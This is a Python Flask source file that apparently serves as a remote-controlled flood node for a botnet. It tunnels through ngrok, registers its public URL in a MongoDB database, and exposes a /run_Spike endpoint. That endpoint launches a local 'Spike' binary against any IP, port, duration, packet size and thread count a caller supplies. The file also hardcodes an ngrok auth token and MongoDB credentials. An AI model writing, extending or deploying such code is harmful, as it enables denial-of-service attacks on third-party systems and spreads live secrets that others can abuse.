import os
import subprocess
import random
from flask import Flask, request, jsonify
from pyngrok import ngrok
from pymongo import MongoClient

app = Flask(__name__)

NGROK_AUTH_TOKEN = "2rRfSEAa6nREyPptqSxGf0cKdi6_7F38iZfMqV8EVafcrkrwE"
ngrok.set_auth_token(NGROK_AUTH_TOKEN)

client = MongoClient("mongodb+srv://BlackHat:Ultimate@cluster0.zvh6z.mongodb.net/BOT?retryWrites=true&w=majority&appName=Cluster0")
db = client["BOT"] 
ngrok_collection = db["urls"]

ngrok_doc = ngrok_collection.find_one({"_id": "ngrok_urls"})
if not ngrok_doc:
    ngrok_collection.insert_one({"_id": "ngrok_urls", "urls": []})
    ngrok_doc = ngrok_collection.find_one({"_id": "ngrok_urls"})

random_port = random.randint(1000, 65535)

tunnel = ngrok.connect(random_port)
public_url = tunnel.public_url
print(f" * ngrok tunnel \"{public_url}\" -> \"http://127.0.0.1:{random_port}\"")

ngrok_collection.update_one(
    {"_id": "ngrok_urls"},
    {"$push": {"urls": public_url}}  
)
print("Ngrok public URL saved to MongoDB")

@app.route('/run_Spike', methods=['POST'])
def run_spike():
    data = request.get_json()
    ip = data.get("ip")
    port = data.get("port")
    duration = data.get("time")
    packet_size = data.get("packet_size")
    threads = data.get("threads")

    if not (ip and port and duration and packet_size and threads):
        return jsonify({"error": "Missing required parameters (ip, port, time, packet_size, threads)"}), 400

    try:
        result = subprocess.run(
            ["./Spike", ip, str(port), str(duration), str(packet_size), str(threads)],
            capture_output=True, text=True
        )

        output = result.stdout
        error = result.stderr
        return jsonify({"output": output, "error": error})

    except Exception as e:
        return jsonify({"error": f"Failed to run Spike: {str(e)}"}), 500

if __name__ == '__main__':
    print(f"Server running at public URL: {public_url}/run_spike")
    app.run(port=random_port)
